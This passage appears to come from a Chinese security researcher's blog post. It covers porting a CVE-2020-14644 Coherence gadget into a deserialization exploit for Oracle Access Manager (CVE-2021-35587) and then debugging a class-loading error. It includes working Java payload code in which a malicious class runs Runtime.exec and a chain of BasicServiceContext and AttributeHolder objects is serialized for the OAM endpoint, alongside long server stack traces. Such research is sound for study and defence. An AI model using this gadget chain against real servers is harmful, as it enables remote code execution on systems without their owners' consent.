basicServiceContext=new BasicServiceContext(1,constructor); System.out.println(oamserialize(basicServiceContext)); } 移植gadget报错：NoClassDefFoundError NoClassDefFoundError CVE-2020-14644最初版本的poccls如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package pers.neo; import com.tangosol.internal.util.invoke.Remotable; import com.tangosol.internal.util.invoke.RemoteConstructor; import java.io.IOException; import java.io.Serializable; public class test7 implements Remotable,Serializable { public test7() { String cmd = \u0026#34;touch /tmp/hackedbyneo8\u0026#34;; try { Runtime.getRuntime().exec(cmd); } catch (IOException e) { e.printStackTrace(); } } public RemoteConstructor getRemoteConstructor() { return null; } public void setRemoteConstructor(RemoteConstructor remoteConstructor) {} } 最初版本的CVE-2021-35587() 如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public static void cve_2021_35587(Class poccls) throws Exception { ClassIdentity classIdentity = new ClassIdentity(poccls); ClassPool cp = ClassPool.getDefault(); CtClass ctClass = cp.get(poccls.getName()); ctClass.replaceClassName(poccls.getName(), poccls.getName() + \u0026#34;$\u0026#34; + classIdentity.getVersion()); RemoteConstructor constructor = new RemoteConstructor( new ClassDefinition(classIdentity, ctClass.toBytecode()), new Object[]{} ); AttributeHolder attributeHolder=new AttributeHolder(); Method setInternalValue=attributeHolder.getClass().getDeclaredMethod(\u0026#34;setInternalValue\u0026#34;,Object.class); setInternalValue.setAccessible(true); setInternalValue.invoke(attributeHolder,constructor); BasicServiceContext basicServiceContext=new BasicServiceContext(1,attributeHolder); System.out.println(oamserialize(basicServiceContext)); } 将test7直接用传入CVE-2021-35587() 函数中，会报错\n终端错误日志如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # docker exec oamms tail -f /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log \u0026lt;Jul 14, 2022 11:02:07,458 AM UTC\u0026gt; \u0026lt;Error\u0026gt; \u0026lt;HTTP\u0026gt; \u0026lt;BEA-101017\u0026gt; \u0026lt;[ServletContext@523535658[app:oam_server module:oam path:null spec-version:3.1]] Root cause of ServletException. java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:756) at java.lang.ClassLoader.defineClass(ClassLoader.java:635) at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181) at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137) Truncated. see log file for complete stacktrace Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable at java.lang.ClassLoader.findClass(ClassLoader.java:523) at java.lang.ClassLoader.loadClass(ClassLoader.java:418) at java.lang.ClassLoader.loadClass(ClassLoader.java:351) at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:756) Truncated. see log file for complete stacktrace \u0026gt; 查看日志看到完整错误堆栈\nu0026lt;Jul 14, 2022 11:32:41,730 AM UTC\u0026gt; \u0026lt;Error\u0026gt; \u0026lt;HTTP\u0026gt; \u0026lt;BEA-101017\u0026gt; \u0026lt;[ServletContext@523535658[app:oam_server module:oam path:null spec-version:3.1]] Root cause of ServletException. java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:756) at java.lang.ClassLoader.defineClass(ClassLoader.java:635) at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181) at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137) Truncated. see log file for complete stacktrace Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable at java.lang.ClassLoader.findClass(ClassLoader.java:523) at java.lang.ClassLoader.loadClass(ClassLoader.java:418) at java.lang.ClassLoader.loadClass(ClassLoader.java:351) at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:756) Truncated. see log file for complete stacktrace \u0026gt; \u0026lt;Jul 14, 2022 11:32:41,738 AM UTC\u0026gt; \u0026lt;Notice\u0026gt; \u0026lt;Diagnostics\u0026gt; \u0026lt;BEA-320068\u0026gt; \u0026lt;Watch \u0026#34;UncheckedException\u0026#34; in module \u0026#34;Module-FMWDFW\u0026#34; with severity \u0026#34;Notice\u0026#34; on server \u0026#34;oam_server1\u0026#34; has triggered at Jul 14, 2022 11:32:41 AM UTC. Notification details: WatchRuleType: Log WatchRule: (log.severityString == \u0026#39;Error\u0026#39;) and ((log.messageId == \u0026#39;WL-101020\u0026#39;) or (log.messageId == \u0026#39;WL-101017\u0026#39;) or (log.messageId == \u0026#39;WL-000802\u0026#39;) or (log.messageId == \u0026#39;BEA-101020\u0026#39;) or (log.messageId == \u0026#39;BEA-101017\u0026#39;) or (log.messageId == \u0026#39;BEA-000802\u0026#39;)) WatchData: MESSAGE = [ServletContext@523535658[app:oam_server module:oam path:null spec-version:3.1]] Root cause of ServletException. java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:756) at java.lang.ClassLoader.defineClass(ClassLoader.java:635) at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181) at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137) at com.tangosol.internal.util.invoke.RemoteConstructor.newInstance(RemoteConstructor.java:122) at com.tangosol.internal.util.invoke.RemoteConstructor.readResolve(RemoteConstructor.java:233) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at java.io.ObjectStreamClass.invokeReadResolve(ObjectStreamClass.java:1275) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2194) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) at weblogic.rmi.provider.BasicServiceContext.readExternal(BasicServiceContext.java:56) at java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) at oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal(OpenssoEngineController.java:2453) at oracle.security.am.proxy.opensso.controller.OpenssoEngineController.processEvent(OpenssoEngineController.java:1069) at oracle.security.am.controller.MasterController.processEvent(MasterController.java:596) at oracle.security.am.controller.MasterController.processRequest(MasterController.java:788) at oracle.security.am.controller.MasterController.process(MasterController.java:708) at oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221) at oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147) at oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107) at oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221) at oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177) at javax.servlet.http.HttpServlet.service(HttpServlet.java:707) at javax.servlet.http.HttpServlet.service(HttpServlet.java:790) at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:295) at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:260) at weblogic.servlet.internal.StubSecurityHelper.invokeServlet(StubSecurityHelper.java:137) at weblogic.servlet.internal.ServletStubImpl.execute(ServletStubImpl.java:353) at weblogic.servlet.internal.TailFilter.doFilter(TailFilter.java:25) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at oracle.security.jps.ee.http.JpsAbsFilter$3.run(JpsAbsFilter.java:175) at java.security.AccessController.doPrivileged(Native Method) at oracle.security.jps.util.JpsSubject.doAsPrivileged(JpsSubject.java:315) at oracle.security.jps.ee.util.JpsPlatformUtil.runJaasMode(JpsPlatformUtil.java:650) at oracle.security.jps.ee.http.JpsAbsFilter.runJaasMode(JpsAbsFilter.java:112) at oracle.security.jps.ee.http.JpsAbsFilter.doFilterInternal(JpsAbsFilter.java:293) at oracle.security.jps.ee.http.JpsAbsFilter.doFilter(JpsAbsFilter.java:150) at oracle.security.jps.ee.http.JpsFilter.doFilter(JpsFilter.java:94) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at oracle.dms.servlet.DMSServletFilter.doFilter(DMSServletFilter.java:248) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at oracle.jrf.servlet.ExtensibleGlobalFilter.doFilter(ExtensibleGlobalFilter.java:92) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.wrapRun(WebAppServletContext.java:3797) at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3763) at weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:344) at weblogic.security.service.SecurityManager.runAsForUserCode(SecurityManager.java:197) at weblogic.servlet.provider.WlsSecurityProvider.runAsForUserCode(WlsSecurityProvider.java:203) at weblogic.servlet.provider.WlsSubjectHandle.run(WlsSubjectHandle.java:71) at weblogic.servlet.internal.WebAppServletContext.doSecuredExecute(WebAppServletContext.java:2451) at weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2299) at weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2277) at weblogic.servlet.internal.ServletRequestImpl.runInternal(ServletRequestImpl.java:1720) at weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1680) at weblogic.servlet.provider.ContainerSupportProviderImpl$WlsRequestExecutor.run(ContainerSupportProviderImpl.java:272) at weblogic.invocation.ComponentInvocationContextManager._runAs(ComponentInvocationContextManager.java:352) at weblogic.invocation.ComponentInvocationContextManager.runAs(ComponentInvocationContextManager.java:337) at weblogic.work.LivePartitionUtility.doRunWorkUnderContext(LivePartitionUtility.java:57) at weblogic.work.PartitionUtility.runWorkUnderContext(PartitionUtility.java:41) at weblogic.work.SelfTuningWorkManagerImpl.runWorkUnderContext(SelfTuningWorkManagerImpl.java:655) at weblogic.work.ExecuteThread.execute(ExecuteThread.java:420) at weblogic.work.ExecuteThread.run(ExecuteThread.java:360) Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable at java.lang.ClassLoader.findClass(ClassLoader.java:523) at java.lang.ClassLoader.loadClass(ClassLoader.java:418) at java.lang.ClassLoader.loadClass(ClassLoader.java:351) at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:756) at java.lang.ClassLoader.defineClass(ClassLoader.java:635) at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181) at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137) at com.tangosol.internal.util.invoke.RemoteConstructor.newInstance(RemoteConstructor.java:122) at com.tangosol.internal.util.invoke.RemoteConstructor.readResolve(RemoteConstructor.java:233) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at java.io.ObjectStreamClass.invokeReadResolve(ObjectStreamClass.java:1275) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2194) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) at weblogic.rmi.provider.BasicServiceContext.readExternal(BasicServiceContext.java:56) at java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) at oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal(OpenssoEngineController.java:2453) at oracle.security.am.proxy.opensso.controller.OpenssoEngineController.processEvent(OpenssoEngineController.java:1069) at oracle.security.am.controller.MasterController.processEvent(MasterController.java:596) at oracle.security.am.controller.MasterController.processRequest(MasterController.java:788) at oracle.security.am.controller.MasterController.process(MasterController.java:708) at oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221) at oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147) at oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107) at oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221) at oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177) at javax.servlet.http.HttpServlet.service(HttpServlet.java:707) at javax.servlet.http.HttpServlet.service(HttpServlet.java:790) at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:295) at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:260) at weblogic.servlet.internal.StubSecurityHelper.invokeServlet(StubSecurityHelper.java:137) at weblogic.servlet.internal.ServletStubImpl.execute(ServletStubImpl.java:353) at weblogic.servlet.internal.TailFilter.doFilter(TailFilter.java:25) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at oracle.security.jps.ee.http.JpsAbsFilter$3.run(JpsAbsFilter.java:175) at java.security.AccessController.doPrivileged(Native Method) at oracle.security.jps.util.JpsSubject.doAsPrivileged(JpsSubject.java:315) at oracle.security.jps.ee.util.JpsPlatformUtil.runJaasMode(JpsPlatformUtil.java:650) at oracle.security.jps.ee.http.JpsAbsFilter.runJaasMode(JpsAbsFilter.java:112) at oracle.security.jps.ee.http.JpsAbsFilter.doFilterInternal(JpsAbsFilter.java:293) at oracle.security.jps.ee.http.JpsAbsFilter.doFilter(JpsAbsFilter.java:150) at oracle.security.jps.ee.http.JpsFilter.doFilter(JpsFilter.java:94) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at oracle.dms.servlet.DMSServletFilter.doFilter(DMSServletFilter.java:248) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at oracle.jrf.servlet.ExtensibleGlobalFilter.doFilter(ExtensibleGlobalFilter.java:92) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.wrapRun(WebAppServletContext.java:3797) at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3763) at weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:344) at weblogic.security.service.SecurityManager.runAsForUserCode(SecurityManager.java:197) at weblogic.servlet.provider.WlsSecurityProvider.runAsForUserCode(WlsSecurityProvider.java:203) at weblogic.servlet.provider.WlsSubjectHandle.run(WlsSubjectHandle.java:71) at weblogic.servlet.internal.WebAppServletContext.doSecuredExecute(WebAppServletContext.java:2451) at weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2299) at weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2277) at weblogic.servlet.internal.ServletRequestImpl.runInternal(ServletRequestImpl.java:1720) at weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1680) at weblogic.servlet.provider.ContainerSupportProviderImpl$WlsRequestExecutor.run(ContainerSupportProviderImpl.java:272) at weblogic.invocation.ComponentInvocationContextManager._runAs(ComponentInvocationContextManager.java:352) at weblogic.invocation.ComponentInvocationContextManager.runAs(ComponentInvocationContextManager.java:337) at weblogic.work.LivePartitionUtility.doRunWorkUnderContext(LivePartitionUtility.java:57) at weblogic.work.PartitionUtility.runWorkUnderContext(PartitionUtility.java:41) at weblogic.work.SelfTuningWorkManagerImpl.runWorkUnderContext(SelfTuningWorkManagerImpl.java:655) at weblogic.work.ExecuteThread.execute(ExecuteThread.java:420) at weblogic.work.ExecuteThread.run(ExecuteThread.java:360) SUPP_ATTRS = {severity-value=8, rid=0, partition-id=0, partition-name=DOMAIN} SERVER = oam_server1 TIMESTAMP = 1657798361730 USERID = \u0026lt;WLS Kernel\u0026gt; MACHINE = dfc3a0c6eea8 MSGID = BEA-101017 DATE = Jul 14, 2022 11:32:41,730 AM UTC SUBSYSTEM = HTTP CONTEXTID = 3c3067f6-a549-49e6-9215-202b032cf4e1-0000014f TXID = THREAD = [ACTIVE] ExecuteThread: \u0026#39;20\u0026#39; for queue: \u0026#39;weblogic.kernel.Default (self-tuning)\u0026#39; SEVERITY = Error WatchAlarmType: AutomaticReset WatchAlarmResetPeriod: 30000 \u0026gt; \u0026lt;Jul 14, 2022 11:32:41,866 AM UTC\u0026gt; \u0026lt;Emergency\u0026gt; \u0026lt;oracle.dfw.incident\u0026gt; \u0026lt;BEA-000000\u0026gt; \u0026lt;incident 32 created with problem key \u0026#34;DFW-99998 [java.lang.ClassNotFoundException][oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal][oam_server]\u0026#34;\u0026gt; 是由 ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable 引起的 NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable 。\n通过下条件异常断点快速复现\n1 this.detailMessage.contains(\u0026#34;internal.util.invoke.Remotable\u0026#34;) 可以看到是在尝试defineclass的时候尝试用 weblogic.utils.classloaders.GenericClassLoader 去加载 com.tangosol.internal.util.invoke.Remotable ，但没有找到。\n搜索类加载器确实也没有\n报错完整调用栈\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 findLocalClass:1029, GenericClassLoader (weblogic.utils.classloaders) findClass:990, GenericClassLoader (weblogic.utils.classloaders) doFindClass:611, GenericClassLoader (weblogic.utils.classloaders) loadClass:543, GenericClassLoader (weblogic.utils.classloaders) loadClass:496, GenericClassLoader (weblogic.utils.classloaders) loadClass:473, GenericClassLoader (weblogic.utils.classloaders) doParentDelegate:584, GenericClassLoader (weblogic.utils.classloaders) loadClass:526, GenericClassLoader (weblogic.utils.classloaders) loadClass:496, GenericClassLoader (weblogic.utils.classloaders) loadClass:71, ChangeAwareClassLoader (weblogic.utils.classloaders) loadClass:405, ClassLoader (java.lang) loadClass:351, ClassLoader (java.lang) 【此处以上的部分通过调试才能看到，错误日志的报错只到native函数的调用为止】 defineClass1:-1, ClassLoader (java.lang) defineClass:756, ClassLoader (java.lang) defineClass:635, ClassLoader (java.lang) ★defineClass:181, RemotableSupport (com.tangosol.internal.util.invoke) realize:137, RemotableSupport (com.tangosol.internal.util.invoke) newInstance:122, RemoteConstructor (com.tangosol.internal.util.invoke) readResolve:233, RemoteConstructor (com.tangosol.internal.util.invoke) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invokeReadResolve:1275, ObjectStreamClass (java.io) readOrdinaryObject:2194, ObjectInputStream (java.io) readObject0:1665, ObjectInputStream (java.io) readObject:501, ObjectInputStream (java.io) readObject:459, ObjectInputStream (java.io) readExternal:56, BasicServiceContext (weblogic.rmi.provider) readExternalData:2234, ObjectInputStream (java.io) readOrdinaryObject:2183, ObjectInputStream (java.io) readObject0:1665, ObjectInputStream (java.io) readObject:501, ObjectInputStream (java.io) readObject:459, ObjectInputStream (java.io) unmarshal:2453, OpenssoEngineController (oracle.security.am.proxy.opensso.controller) processEvent:1069, OpenssoEngineController (oracle.security.am.proxy.opensso.controller) processEvent:596, MasterController (oracle.security.am.controller) processRequest:788, MasterController (oracle.security.am.controller) process:708, MasterController (oracle.security.am.controller) delegateToMasterController:221, PBLFlowManager (oracle.security.am.pbl) handleBaseEvent:147, PBLFlowManager (oracle.security.am.pbl) processRequest:107, PBLFlowManager (oracle.security.am.pbl) handleRequest:221, AMServlet (oracle.security.am.pbl.transport.http) doPost:177, AMServlet (oracle.security.am.pbl.transport.http) service:707, HttpServlet (javax.servlet.http) service:790, HttpServlet (javax.servlet.http) run:295, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal) run:260, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal) invokeServlet:137, StubSecurityHelper (weblogic.servlet.internal) execute:353, ServletStubImpl (weblogic.servlet.internal) doFilter:25, TailFilter (weblogic.servlet.internal) doFilter:78, FilterChainImpl (weblogic.servlet.internal) run:175, JpsAbsFilter$3 (oracle.security.jps.ee.http) doPrivileged:-1, AccessController (java.security) doAsPrivileged:315, JpsSubject (oracle.security.jps.util) runJaasMode:650, JpsPlatformUtil (oracle.security.jps.ee.util) runJaasMode:112, JpsAbsFilter (oracle.security.jps.ee.http) doFilterInternal:293, JpsAbsFilter (oracle.security.jps.ee.http) doFilter:150, JpsAbsFilter (oracle.security.jps.ee.http) doFilter:94, JpsFilter (oracle.security.jps.ee.http) doFilter:78, FilterChainImpl (weblogic.servlet.internal) doFilter:248, DMSServletFilter (oracle.dms.servlet) doFilter:78, FilterChainImpl (weblogic.servlet.internal) doFilter:92, ExtensibleGlobalFilter (oracle.jrf.servlet) doFilter:78, FilterChainImpl (weblogic.servlet.internal) wrapRun:3797, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal) run:3763, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal) doAs:344, AuthenticatedSubject (weblogic.security.acl.internal) runAsForUserCode:197, SecurityManager (weblogic.security.service) runAsForUserCode:203, WlsSecurityProvider (weblogic.servlet.provider) run:71, WlsSubjectHandle (weblogic.servlet.provider) doSecuredExecute:2451, WebAppServletContext (weblogic.servlet.internal) securedExecute:2299, WebAppServletContext (weblogic.servlet.internal) execute:2277, WebAppServletContext (weblogic.servlet.internal) runInternal:1720, ServletRequestImpl (weblogic.servlet.internal) run:1680, ServletRequestImpl (weblogic.servlet.internal) run:272, ContainerSupportProviderImpl$WlsRequestExecutor (weblogic.servlet.provider) _runAs:352, ComponentInvocationContextManager (weblogic.invocation) runAs:337, ComponentInvocationContextManager (weblogic.invocation) doRunWorkUnderContext:57, LivePartitionUtility (weblogic.work) runWorkUnderContext:41, PartitionUtility (weblogic.work) runWorkUnderContext:655, SelfTuningWorkManagerImpl (weblogic.work) execute:420, ExecuteThread (weblogic.work) run:360, ExecuteThread (weblogic.work) 到这里百思不得其解，一遍遍反复调试都是一样的结果。为什么几乎一样的运行时，移植之后就找不到这个类了呢？\n错误出在defineclass 错误堆栈：\n几次F9之后在调试器中完全复刻了日志中的错误堆栈\n可以看到整个反序列化过程，从 oracle.security.am.pbl.transport.http.AMServlet.doPost 到 异常抛出，经过几个反序列化点\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 at java.lang.ClassLoader.defineClass(ClassLoader.java:635) at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181) at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137) at com.tangosol.internal.util.invoke.RemoteConstructor.newInstance(RemoteConstructor.java:122) at com.tangosol.internal.util.invoke.RemoteConstructor.readResolve(RemoteConstructor.java:233) at com.tangosol.util.ExternalizableHelper.realize(ExternalizableHelper.java:4938) at com.tangosol.util.ExternalizableHelper.readObject(ExternalizableHelper.java:2607) at com.tangosol.util.ExternalizableHelper.readObject(ExternalizableHelper.java:2583) at com.tangosol.coherence.servlet.AttributeHolder.readExternal(AttributeHolder.java:407) at com.tangosol.coherence.servlet.AttributeHolder.readExternal(AttributeHolder.java:372) at java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) at weblogic.rmi.provider.BasicServiceContext.readExternal(BasicServiceContext.java:56) at java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) at oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal(OpenssoEngineController.java:2453) 只在尝试 com.tangosol.internal.util.invoke.RemoteConstructor.newInstance 的时候找不到 com.tangosol.internal.util.invoke.Remotable 。\n虽然报错是\n1 java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable 但从生成payload的代码结合上面的错误堆栈来看，可能并不是没有找到 com.tangosol.internal.util.invoke.Remotable 这个类，而是在构建这个类的过程中，尝试通过字节码defineclass的时候出错了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public static void cve_2020_14644_wrap() throws Exception { ClassIdentity classIdentity = new ClassIdentity(test6.class); ClassPool cp = ClassPool.getDefault(); CtClass ctClass = cp.get(test6.class.getName()); ctClass.replaceClassName(test6.class.getName(), test6.class.getName() + \u0026#34;$\u0026#34; + classIdentity.getVersion()); System.out.println(ctClass.getName()); RemoteConstructor constructor = new RemoteConstructor( new ClassDefinition(classIdentity, ctClass.toBytecode()), new Object[]{} ); AttributeHolder attributeHolder=new AttributeHolder(); Method setInternalValue=attributeHolder.getClass().getDeclaredMethod(\u0026#34;setInternalValue\u0026#34;,Object.class); setInternalValue.setAccessible(true); setInternalValue.invoke(attributeHolder,constructor); BasicServiceContext basicServiceContext=new BasicServiceContext(1,attributeHolder); // String sobj = serialize(basicServiceContext); // System.out.println(sobj); // deserialize(sobj); // writeTextToClipboard(oamserialize(basicServiceContext)); System.out.println(oamserialize(basicServiceContext)); } 而且我们可以看到，gadgetchain中的前面几个类都已经被找到并且成功创建出来了。\n排除字节码类名不匹配 在 com.tangosol.internal.util.invoke.RemotableSupport.realize 下断点，最终会看到进64行后报错，而没有办法真正执行到69行去创建对象。\n这里注意到文档说明\n1 2 3 4 If name is not null, it must be equal to the binary name of the class specified by the byte array \u0026#34;b\u0026#34;, otherwise a NoClassDefFoundError will be thrown. ...... Throws: NoClassDefFoundError – If name is not equal to the binary name of the class specified by b 这个错误NoClassDefFoundError 和我们在log中看到的一模一样，很有可能是这个问题导致的。\n再细看此时的参数状态，传入的类名是 pers.neo.test$C5BD10F93D5F6E3E791935D6BFC036F5 。\n看一下传入的requester参数中的序列化数据中的类名是什么？是 pers/neo/test$C5BD10F93D5F6E3E791935D6BFC036F5\n一模一样，那么为什么呢？反反复复，继续在接下来这一行中报出错误：\n再跟入就是native代码了。\n会不会是字节码中的类名传入的参数的类名不一致导致的呢？尝试使用 https://www.class-visualizer.net/download.html 可视化test.class 类，看看是否因为idea直接编译导致的产生临时随机类名。\n但调试可以看到类名是代码自己取出来处理过的，没有问题。\n这个将字节码中的类名进行替换（加上versionid）的动作是CVE-2020-14644所需要进行的正常操作，为了满足ClassIdentity所需要的特殊逻辑。\n如果不做改变的话反而会报类似下面这样的 wrong name 的错误\n1 Exception in thread \u0026#34;main\u0026#34; java.lang.NoClassDefFoundError: pers/neo/test1$8CEAA052CA2629E7D4BAD619B2948F57 (wrong name: pers/neo/test1$5DF7AE1FE635F73F435EBEC61A76120B) 并且本地编译多次，确认 classIdentity.getVersion() 对于同一个类总是能拿到一样的version值。\n至此排除是defineClass时候类名不一致导致的问题。\n同时，我发现自己一直选择性忽略一个关键事实\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:756) at java.lang.ClassLoader.defineClass(ClassLoader.java:635) at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181) at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137) Truncated. see log file for complete stacktrace Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable at java.lang.ClassLoader.findClass(ClassLoader.java:523) at java.lang.ClassLoader.loadClass(ClassLoader.java:418) at java.lang.ClassLoader.loadClass(ClassLoader.java:351) at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:756) Truncated. see log file for complete stacktrace 在这个报错中， java.lang.NoClassDefFoundError 是由 ClassNotFoundException 引起的。 所以本质上是因为 com.tangosol.internal.util.invoke.Remotable 找不到，而不是pers.neo.test1$8CEAA052CA2629E7D4BAD619B2948F57 不对。如果我看得够认真，思考得足够慢，一早该发现这一点。\n本地defineClass demo调试 